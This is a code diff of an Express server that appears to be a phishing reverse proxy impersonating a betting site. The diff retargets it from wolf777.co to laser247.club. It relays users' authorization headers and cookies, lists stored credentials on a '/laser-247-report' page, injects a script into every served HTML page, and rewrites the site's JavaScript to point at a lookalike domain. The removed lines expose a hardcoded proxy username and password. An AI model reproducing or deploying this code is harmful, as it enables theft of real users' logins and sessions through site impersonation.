@@ -7,13 +7,6 @@ const FormData = require("form-data");
 
 const { UserModel } = require("./db");
 
-const { HttpsProxyAgent } = require("https-proxy-agent");
-
-const proxyUrl =
-  "http://brd-customer-hl_0998b05b-zone-wolf777_new:97pn7s293a50@brd.superproxy.io:33335";
-
-const httpsAgent = new HttpsProxyAgent(proxyUrl);
-
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -96,15 +89,15 @@ app.use("/api", async (req, res) => {
     const { method, headers, query, url, body } = req;
 
     // Construct target URL
-    const targetUrl = `https://wolf777.co/api${url}`;
+    const targetUrl = `https://api.dlaser247.com/api${url}`;
 
     let axiosData;
     let axiosHeaders = {
       authorization: headers.authorization,
       cookie: headers.cookie,
-      host: "wolf777.co",
-      origin: "https://wolf777.co",
-      referer: "https://wolf777.co/",
+      host: "api.dlaser247.com",
+      origin: "https://api.dlaser247.com",
+      referer: "https://api.dlaser247.com/",
     };
 
     if (
@@ -125,7 +118,6 @@ app.use("/api", async (req, res) => {
     }
 
     const axiosResponse = await axios({
-      httpsAgent,
       method,
       url: targetUrl,
       headers: axiosHeaders,
@@ -166,7 +158,7 @@ app.use("/api", async (req, res) => {
   }
 });
 
-app.get("/wolf-777-report", async (req, res) => {
+app.get("/laser-247-report", async (req, res) => {
   const crendentials = await UserModel.find();
 
   const html = `<table style="width: 100%; text-align: center; border-collapse: collapse; border: 1px solid black;">
@@ -195,42 +187,55 @@ app.get("/wolf-777-report", async (req, res) => {
     .send(html);
 });
 
-app.get("*", (req, res) => {
-  if (req.url.startsWith("/api")) return;
+app.use("/assets", async (req, res) => {
+  try {
+    // Construct the target URL using the rest of the URL after /assets
+    const targetUrl = `https://laser247.club/assets${req.url}`;
 
+    // Make a GET request to the target URL
+    const response = await axios.get(targetUrl, {
+      responseType: "arraybuffer", // Use arraybuffer to handle any type of data (images, CSS, etc.)
+    });
+
+    // Set headers from the response to maintain the correct content type
+    res.set(response.headers);
+
+    // Send the data back to the client
+    res.send(response.data);
+  } catch (error) {
+    console.error("Error fetching asset:", error.message);
+    res.status(error.response?.status || 500).send("Error fetching asset");
+  }
+});
+
+app.get("*", (req, res) => {
   axios
-    .get(`https://wolf777.co${req.url}`, {
+    .get(`https://laser247.club${req.url}`, {
       headers: {
-        host: "wolf777.co",
-        origin: "https://wolf777.co",
-        referer: "https://wolf777.co/",
-        "User-Agent":
-          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
-        Accept:
-          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        Connection: "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
+        host: "laser247.club",
+        origin: "https://laser247.club",
+        referer: "https://laser247.club/",
       },
-      httpsAgent,
     })
     .then((response) => {
       const position = response.data.indexOf(`</body>`);
-      let beforeInsert = response.data.slice(0, position).split("");
-
-      response.headers["content-type"].includes("text/html")
-        ? beforeInsert.splice(
-            response.data.indexOf(`</head>`),
-            0,
-            "<style type='text/css'>.fa{font-weight: 900!important; font-family: 'Font Awesome 5 Free'!important}</style>"
-          )
-        : null;
-      beforeInsert = beforeInsert.join("");
+      let beforeInsert = response.data.slice(0, position);
       const afterInsert = response.data.slice(position);
       const toBeInsert = response.headers["content-type"].includes("text/html")
         ? `<script>${reactPkg}</script>`
         : "";
+
+      response.headers["content-type"].includes("text/javascript") &&
+      req.url.startsWith("/main.")
+        ? (() => {
+            beforeInsert = beforeInsert.replace("localhost", "");
+
+            beforeInsert = beforeInsert.replace(
+              "laser247.club",
+              "laaser247.com"
+            );
+          })()
+        : null;
 
       res
         .header({
